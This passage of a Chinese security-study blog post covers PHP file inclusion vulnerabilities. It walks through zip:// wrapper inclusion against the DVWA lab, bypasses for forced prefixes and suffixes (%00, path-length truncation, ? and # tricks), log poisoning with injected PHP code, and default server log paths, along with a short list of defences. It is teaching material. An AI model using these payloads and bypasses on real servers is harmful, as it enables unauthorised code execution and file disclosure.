+</ul>
+
+        <h3 id="4-7-1：示例"   >
+          <a href="#4-7-1：示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-7-1：示例" class="headerlink" title="4.7.1：示例"></a>4.7.1：示例</h3>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<ul>
+<li>压缩包 test.zip 内的文件路径为 <code>test/phpinfo.txt</code></li>
+</ul>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-23-09.png" alt="Alt text"></p>
+<ul>
+<li>通过 <code>zip://&lt;zip文件路径&gt;#&lt;内部文件路径&gt;</code> 进行代码执行</li>
+</ul>
+<p><code>?page=zip://D:/T/test.zip%23test/phpinfo.txt</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-21-11-25-17.png" alt="Alt text"></p>
+
+        <h1 id="5：防护绕过"   >
+          <a href="#5：防护绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#5：防护绕过" class="headerlink" title="5：防护绕过"></a>5：防护绕过</h1>
+      
+        <h2 id="5-1：绕过前缀指定"   >
+          <a href="#5-1：绕过前缀指定" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-1：绕过前缀指定" class="headerlink" title="5.1：绕过前缀指定"></a>5.1：绕过前缀指定</h2>
+      <p>如果代码中明确指定了文件前缀：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span> . <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>绕过方法</strong>：</p>
+<ul>
+<li>利用回溯符【<code>../</code>】进行目录遍历</li>
+</ul>
+<blockquote>
+<p>对于 Windows 系统，如果指定的目录在某个盘符下，则只能遍历该盘符下的目录，无法跨盘符</p>
+</blockquote>
+
+        <h2 id="5-2：绕过后缀指定"   >
+          <a href="#5-2：绕过后缀指定" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2：绕过后缀指定" class="headerlink" title="5.2：绕过后缀指定"></a>5.2：绕过后缀指定</h2>
+      <p>如果代码中明确指定了文件后缀（或者其他类似情况）：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span> . <span class="string">&quot;.html&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>绕过方法</strong>：</p>
+<ul>
+<li><code>%00</code> 截断</li>
+<li>路径长度截断</li>
+<li>点号【<code>.</code>】截断</li>
+<li>问号【<code>?</code>】绕过</li>
+<li>井号【<code>#</code>】绕过</li>
+<li>伪协议绕过（方法见【4：验证 &amp; 利用】）</li>
+</ul>
+
+        <h3 id="5-2-1：-00-截断（待验证）"   >
+          <a href="#5-2-1：-00-截断（待验证）" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-1：-00-截断（待验证）" class="headerlink" title="5.2.1：%00 截断（待验证）"></a>5.2.1：%00 截断（待验证）</h3>
+      <p><strong>适用场景</strong>：</p>
+<ul>
+<li>PHP 版本小于 5.3.4</li>
+<li>php.ini 中 magic_quotes_gpc &#x3D; Off</li>
+<li>没有使用转义函数</li>
+</ul>
+<p><strong>绕过方法</strong>：</p>
+<ul>
+<li>在传递的文件名后加上【<code>%00</code>】</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?path=welcome</span><br><span class="line"><span class="comment">// 后端接收并拼接后缀的结果：welcome.html</span></span><br><span class="line"></span><br><span class="line">?path=phpinfo.txt%<span class="number">00</span></span><br><span class="line"><span class="comment">// 后端接收并拼接后缀的结果：phpinfo.txt[0x00].html</span></span><br><span class="line"><span class="comment">// 导致 .html 被截断，实际包含 phpinfo.txt 文件</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h3 id="5-2-2：路径长度截断（待验证）"   >
+          <a href="#5-2-2：路径长度截断（待验证）" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-2：路径长度截断（待验证）" class="headerlink" title="5.2.2：路径长度截断（待验证）"></a>5.2.2：路径长度截断（待验证）</h3>
+      <p>原理：对于文件和目录名，如果数据超过最大值后超出的数据会被直接丢弃掉。</p>
+<p><strong>适用场景</strong>：</p>
+<ul>
+<li>PHP 版本小于 5.2.8</li>
+</ul>
+<p><strong>绕过方法</strong>：</p>
+<ul>
+<li>在传递的文件名后不断的重复添加【<code>./</code>】</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?path=phpinfo.txt/./././././././././././././././././././ 后面省略</span><br><span class="line"><span class="comment">// 后端接收并拼接，由于超过最大值导致 .html 被截断，实际包含 phpinfo.txt 文件</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="5-2-3：【-】截断（待验证）"   >
+          <a href="#5-2-3：【-】截断（待验证）" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-3：【-】截断（待验证）" class="headerlink" title="5.2.3：【.】截断（待验证）"></a>5.2.3：【.】截断（待验证）</h3>
+      <p>原理同【5.2.2：路径长度截断】。</p>
+<p><strong>适用场景</strong>：</p>
+<ul>
+<li>PHP 版本小于 5.2.8</li>
+<li>操作系统为 Windows</li>
+</ul>
+<p><strong>绕过方法</strong>：</p>
+<ul>
+<li>在传递的文件名后不断的重复添加【<code>.</code>】</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?path=phpinfo.txt................................ 后面省略</span><br><span class="line"><span class="comment">// 后端接收并拼接，由于超过最大值导致 .html 被截断，实际包含 phpinfo.txt 文件</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="5-2-4：【-】绕过"   >
+          <a href="#5-2-4：【-】绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-4：【-】绕过" class="headerlink" title="5.2.4：【?】绕过"></a>5.2.4：【?】绕过</h3>
+      <p>原理：URL【<code>?</code>】后面的内容被当作请求的参数，从而使用问号来实现伪截断。</p>
+<p><strong>适用场景</strong>：</p>
+<ul>
+<li>对 HTTP&#x2F;HTTPS 协议的远程文件包含有效</li>
+</ul>
+<p><strong>绕过方法</strong>：</p>
+<ul>
+<li>在传递的 URL 最后添加【<code>?</code>】</li>
+</ul>
+
+        <h4 id="5-2-4-1：示例"   >
+          <a href="#5-2-4-1：示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-4-1：示例" class="headerlink" title="5.2.4.1：示例"></a>5.2.4.1：示例</h4>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<p><code>?page=http://192.168.8.1:8000/phpinfo.txt?</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-09-47.png" alt="Alt text"></p>
+
+        <h3 id="5-2-5：【-】绕过"   >
+          <a href="#5-2-5：【-】绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-5：【-】绕过" class="headerlink" title="5.2.5：【#】绕过"></a>5.2.5：【#】绕过</h3>
+      <p>原理：URL【<code>#</code>】为片段标识符，后面的内容被当作一个位置，从而可以用来实现伪截断。</p>
+<p><strong>适用场景</strong>：</p>
+<ul>
+<li>对 HTTP&#x2F;HTTPS 协议的远程文件包含有效</li>
+</ul>
+<p><strong>绕过方法</strong>：</p>
+<ul>
+<li>在传递的 URL 最后添加【<code>#</code>】</li>
+</ul>
+
+        <h4 id="5-2-5-1：示例"   >
+          <a href="#5-2-5-1：示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-2-5-1：示例" class="headerlink" title="5.2.5.1：示例"></a>5.2.5.1：示例</h4>
+      <blockquote>
+<p>以 DVWA File-Inclusion（low）为例。</p>
+</blockquote>
+<p><code>?page=http://192.168.8.1:8000/phpinfo.txt#</code></p>
+<p><img src="/../../../assets/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02/2024-11-22-13-16-09.png" alt="Alt text"></p>
+
+        <h1 id="6：防范方法"   >
+          <a href="#6：防范方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#6：防范方法" class="headerlink" title="6：防范方法"></a>6：防范方法</h1>
+      <ul>
+<li>尽量不使用动态包含</li>
+<li>对于 php.ini 配置文件，将 allow_url_include 和 allow_url_fopen 配置为 Off，或者最小权限化</li>
+<li>严格检查地址，不允许出现目录跳转符</li>
+<li>可以使用白名单，对可以包含的文件进行限制</li>
+</ul>
+
+        <h1 id="7：补充知识"   >
+          <a href="#7：补充知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#7：补充知识" class="headerlink" title="7：补充知识"></a>7：补充知识</h1>
+      
+        <h2 id="7-1：伪协议介绍"   >
+          <a href="#7-1：伪协议介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-1：伪协议介绍" class="headerlink" title="7.1：伪协议介绍"></a>7.1：伪协议介绍</h2>
+      <blockquote>
+<p>封装协议（Stream Wrappers），也被称为伪协议（Pseudo-protocols）。</p>
+</blockquote>
+<p><strong>封装协议</strong>是开发语言提供的一种机制，允许通过统一的接口访问不同类型的资源（例如文件系统、网络资源、压缩流、数据流等）。</p>
+<p><strong>为什么称作伪协议</strong>：</p>
+<ul>
+<li>并非真正的底层网络通信协议，而是通过抽象机制实现，统一资源访问的接口，模拟了协议的功能</li>
+<li>使用时的形式类似于 URL，使其看起来像一种协议，但实际上底层逻辑由开发语言实现，具体操作会调用开发语言内置的扩展或函数</li>
+</ul>
+
+        <h3 id="7-1-1：真实协议与伪协议对比"   >
+          <a href="#7-1-1：真实协议与伪协议对比" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-1-1：真实协议与伪协议对比" class="headerlink" title="7.1.1：真实协议与伪协议对比"></a>7.1.1：真实协议与伪协议对比</h3>
+      <div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">特性</th>
+<th align="left">真实协议（如 HTTP）</th>
+<th align="left">伪协议（如 PHP 封装协议）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">定义</td>
+<td align="left">国际标准组织定义，跨语言跨平台</td>
+<td align="left">PHP 自定义实现</td>
+</tr>
+<tr>
+<td align="left">使用场景</td>
+<td align="left">网络通信或操作系统底层功能</td>
+<td align="left">PHP 应用中的抽象访问</td>
+</tr>
+<tr>
+<td align="left">实现方式</td>
+<td align="left">操作系统内核或网络堆栈支持</td>
+<td align="left">PHP 内部函数或扩展实现</td>
+</tr>
+<tr>
+<td align="left">扩展性</td>
+<td align="left">固定协议规则</td>
+<td align="left">需要通过 <code>stream_wrapper_register</code> 扩展</td>
+</tr>
+<tr>
+<td align="left">典型示例</td>
+<td align="left">HTTP、FTP、SSH 等</td>
+<td align="left"><code>php://</code>、<code>phar://</code> 等</td>
+</tr>
+</tbody></table></div>
+
+        <h3 id="7-1-2：PHP-伪协议介绍"   >
+          <a href="#7-1-2：PHP-伪协议介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-1-2：PHP-伪协议介绍" class="headerlink" title="7.1.2：PHP 伪协议介绍"></a>7.1.2：PHP 伪协议介绍</h3>
+      <p><code>php://</code>：访问 PHP 的输入&#x2F;输出流以及其他特殊流。</p>
+<p>常见用法：</p>
+<ul>
+<li><code>php://input</code>：读取原始 POST 数据</li>
+<li><code>php://output</code>：只写流，直接写入 PHP 输出缓冲区</li>
+<li><code>php://filter</code>：在文件流的读取或写入过程中，动态应用过滤器。常用于编码转换或特殊处理</li>
+<li><code>php://memory</code>：创建内存流</li>
+<li><code>php://temp</code>：创建临时文件流</li>
+</ul>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rawData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始 POST 数据: &quot;</span> . <span class="variable">$rawData</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设通过 POST 请求发送 JSON 数据： &#123;&quot;key&quot;:&quot;value&quot;&#125;</span></span><br><span class="line"><span class="comment">// 输出：原始 POST 数据: &#123;&quot;key&quot;:&quot;value&quot;&#125;</span></span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p><code>zlib://</code>：访问压缩流，用于读取或写入 gzip 压缩数据。</p>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;zlib://example.gz&#x27;</span>);</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p><code>data://</code>：通过内联数据访问资源（符合 RFC 2397 标准）。</p>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;data:text/plain;base64,SGVsbG8gd29ybGQ=&#x27;</span>);</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p><code>zip://</code>：用于直接访问 .zip 压缩文件中的内容（只支持读取操作，不能修改或写入压缩包）。</p>
+<p>语法：<code>zip://&lt;zip文件路径&gt;#&lt;内部文件路径&gt;</code></p>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取 archive.zip 中 file.txt 的内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;zip://path/to/archive.zip#file.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p><code>glob://</code>：查找匹配的文件路径模式（实际上是 <code>glob()</code> 函数的包装）。</p>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">glob</span>(<span class="string">&#x27;glob://*.php&#x27;</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p><code>phar://</code>：访问 PHP 归档（PHAR）文件中的内容。</p>
+<p>示例：</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar://archive.phar/file.txt&#x27;</span>);</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="7-2：日志文件包含利用"   >
+          <a href="#7-2：日志文件包含利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-2：日志文件包含利用" class="headerlink" title="7.2：日志文件包含利用"></a>7.2：日志文件包含利用</h2>
+      <p>日志会记录客户端请求及服务器响应的信息，几乎所有的网站都配置了日志功能。</p>
+<p>因此，攻击者可以通过构造访问，使 Web 日志插入 PHP 代码，然后通过文件包含漏洞来包含日志文件，执行包含在日志中的 PHP 代码。</p>
+<p>示例：</p>
+<ul>
+<li>请求 <code>http://example.com/&lt;?php phpinfo(); ?&gt;</code> 时，<code>&lt;?php phpinfo(); ?&gt;</code> 也会被记录在日志里</li>
+<li>也可以将代码插入到 User-Agent 头里</li>
+<li>之后通过路径包含日志文件即可利用</li>
+</ul>
+<p>注意：</p>
+<ul>
+<li>请求的信息有可能被 URL 编码之后记录到日志，可以通过 BurpSuite 发送请求包来防止被编码</li>
+<li>如果网站访问量很大，日志文件可能会非常大，如果包含很大的文件时，PHP 进程可能会卡死</li>
+<li>一般网站会每天生成一个新的日志文件，因此在凌晨时进行攻击相对来说容易成功</li>
+</ul>
+
+        <h3 id="7-2-1：补充"   >
+          <a href="#7-2-1：补充" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-2-1：补充" class="headerlink" title="7.2.1：补充"></a>7.2.1：补充</h3>
+      <p>Apache 可能的日志路径：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">D:\xampp\apache\logs\access.log</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p>IIS 可能的日志路径：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br><span class="line">%SystemDrive%\inetpub\logs\LogFiles</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<p>Nginx 可能的日志路径：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/nginx/logs</span><br><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h1 id="8：其他"   >
+          <a href="#8：其他" class="heading-link"><i class="fas fa-link"></i></a><a href="#8：其他" class="headerlink" title="8：其他"></a>8：其他</h1>
+      
+        <h2 id="8-1：相关平台"   >
+          <a href="#8-1：相关平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-1：相关平台" class="headerlink" title="8.1：相关平台"></a>8.1：相关平台</h2>
+      <p>DVWA：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/digininja/DVWA" >https://github.com/digininja/DVWA</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="8-2：参考资料"   >
+          <a href="#8-2：参考资料" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-2：参考资料" class="headerlink" title="8.2：参考资料"></a>8.2：参考资料</h2>
+      <p>《【Java 代码审计入门-06】文件包含漏洞原理与实际案例介绍》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnpanda.net/codeaudit/1037.html" >https://www.cnpanda.net/codeaudit/1037.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《面试中碰到的坑之包含漏洞专题》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1144850" >https://cloud.tencent.com/developer/article/1144850</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《文件包含漏洞学习小结》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291633.html" >https://www.freebuf.com/articles/web/291633.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《关于文件包含漏洞的一些知识点》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12506" >https://xz.aliyun.com/t/12506</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《默认日志和配置文件路径》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5853703.html" >https://www.cnblogs.com/my1e3/p/5853703.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《文件包含漏洞与文件包含Bypass漏洞基础》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1597432" >https://cloud.tencent.com/developer/article/1597432</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>《php文件包含漏洞》：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" >https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<hr>
+<hr>
+<hr>
+<p><font color="#DD0000">
+半世浮萍随逝水，一宵冷雨葬名花。
+</font></p>
+<p align="right"><font color="#DD0000">
+——《山花子》（清）纳兰性德
+</font></p>
+
+
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://blog.lens-shrine.top">镜坛主</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://blog.lens-shrine.top/2023/09/07/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://blog.lens-shrine.top/2023/09/07/KnowledgeLog%EF%BC%9A%E6%B8%97%E9%80%8F%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/Web%E5%AE%89%E5%85%A8/02.%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/09/11/WriteUp%EF%BC%9ACyber-Range/VulnHub/02.%20DarkHole%EF%BC%9A1/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">《VulnHub》DarkHole：1</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/09/04/WriteUp%EF%BC%9ACyber-Range/VulnHub/01.%20Empire%EF%BC%9ABreakout/"><span class="paginator-prev__text">《VulnHub》Empire：Breakout</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%EF%BC%9A%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">
+          1：漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">
+          1.1：漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2%EF%BC%9A%E5%8D%B1%E5%AE%B3"><span class="toc-text">
+          1.2：危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">
+          1.3：利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4%EF%BC%9A%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="toc-text">
+          1.4：根本原因</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">
+          2：注入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%9A%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-text">
+          3：漏洞类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%EF%BC%9A%E9%AA%8C%E8%AF%81-%E5%88%A9%E7%94%A8"><span class="toc-text">
+          4：验证 &amp; 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1%EF%BC%9A%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">
+          4.1：漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2%EF%BC%9A%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">
+          4.2：本地文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3%EF%BC%9A%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">
+          4.3：远程文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%90php-input%E3%80%91"><span class="toc-text">
+          4.4：伪协议【php:&#x2F;&#x2F;input】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%90php-filter%E3%80%91"><span class="toc-text">
+          4.5：伪协议【php:&#x2F;&#x2F;filter】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%90data-%E3%80%91"><span class="toc-text">
+          4.6：伪协议【data:&#x2F;&#x2F;】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%90zip-%E3%80%91"><span class="toc-text">
+          4.7：伪协议【zip:&#x2F;&#x2F;】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5%EF%BC%9A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="toc-text">
+          5：防护绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1%EF%BC%9A%E7%BB%95%E8%BF%87%E5%89%8D%E7%BC%80%E6%8C%87%E5%AE%9A"><span class="toc-text">
+          5.1：绕过前缀指定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2%EF%BC%9A%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80%E6%8C%87%E5%AE%9A"><span class="toc-text">
+          5.2：绕过后缀指定</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6%EF%BC%9A%E9%98%B2%E8%8C%83%E6%96%B9%E6%B3%95"><span class="toc-text">
+          6：防范方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7%EF%BC%9A%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86"><span class="toc-text">
+          7：补充知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D"><span class="toc-text">
+          7.1：伪协议介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2%EF%BC%9A%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-text">
+          7.2：日志文件包含利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8%EF%BC%9A%E5%85%B6%E4%BB%96"><span class="toc-text">
+          8：其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1%EF%BC%9A%E7%9B%B8%E5%85%B3%E5%B9%B3%E5%8F%B0"><span class="toc-text">
